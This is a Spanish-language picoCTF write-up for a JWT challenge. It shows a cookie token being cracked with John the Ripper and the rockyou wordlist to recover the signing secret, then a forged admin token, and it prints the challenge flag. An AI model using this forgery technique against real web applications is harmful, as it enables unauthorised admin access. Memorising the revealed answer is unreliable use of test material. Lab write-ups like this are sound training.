### Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

Hints:
1. What is that cookie?
2. Have you heard of JWT?

### Solución
Al logearnos y agarrar la cookie generada para decodearla en jwt.io hay que modificar el usuario a admin:
```
Decoded:
"user":"admin"
}

Encoded:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww
```
Esto nos manda un error.

Lo que hay que hacer es guardar la cookie en un archivo y hacer uso de john para obtener la palabra clave:
```
┌──(kali㉿kali)-[~]
└─$ nano hash
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat hash                                  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2ViYXMifQ.IIpBNY1OkIccvm4NaMzVeNMN5tY3JAADnRvjHZ7DPFg
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
amass      dnsmap.txt     john.lst    nmap.lst        wfuzz
dirb       fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt
                                                                             
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                         
amass      dnsmap.txt     john.lst    nmap.lst     wfuzz
dirb       fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt
                                                                             
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo apt install john                           
john is already the newest version (1.9.0-Jumbo-1+git20211102-0kali9).
john set to manually installed.
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0
                                                                                 
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:07 DONE (2025-03-26 20:51) 0.1369g/s 1013Kp/s 1013Kc/s 1013KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

ilovepico es la palabra con la que fue firmado el token.
Esta la modificamos en el jwt.io para agregarla a las características de la cookie lo que cambia el hash y al editar esté en la cookie original ahora nos muestra la bandera en la caja de texto:

Flag:
picoCTF{jawt_was_just_what_you_thought_f859ab2f}

### Notas adicionales


### Referencias
https://jwt.io/
Cookie-Editor
